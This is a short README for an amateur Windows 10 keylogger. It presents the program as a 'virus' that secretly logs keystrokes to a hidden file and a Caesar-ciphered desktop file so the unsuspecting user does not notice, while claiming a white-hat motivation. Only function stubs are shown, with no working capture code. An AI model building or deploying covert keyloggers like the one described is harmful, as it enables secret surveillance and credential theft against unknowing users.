Keylogger Encryption readme
Synopsis:
The program I have created is an Keylogger virus. This is a virus that creates two files: One file is plain text and it is hidden somewhere in the computers directory file. The second file is located on the desktop and it is encrypted via ceaser cipher to make sure that the unsuspecting person does not know what it is you are recording. This way you can obtain the infomration you want from the user and prevent getting caught by the user.

Code Example:
string RegularAndEncryptedRecordings(string typedkeys);
int ConvertStringToInt(string typedkeys);
char ConvertCharToString(string typedkeys);
string ConvertStringToChar(char stuff);
string CipherEncryption(char d, string typedkeys);

int main()
{
	string typedkeys;

	RegularAndEncryptedRecordings(typedkeys);
    	return 0;
}


Motivation:
The motivation for this project is to have white hat hackers, and software developers to gain ideas from the indie programmer community to help prevent virus from infecting computers. Also this program is for pentration testers and any software developers looking to create better defenses for computing systems.

Installation:
The program requires a windows 10 based enviroment in order to work. The reason being is that two of libares (Winuser.h and windows.h) is only made for a windows 10 enviroment and it is not backwards compatable. So in order to avoid any problems using the software make sure it is running in a windows 10 enviroment. The program itself is not backwards compatable and it does not work on any other operating system but Windows 10. 

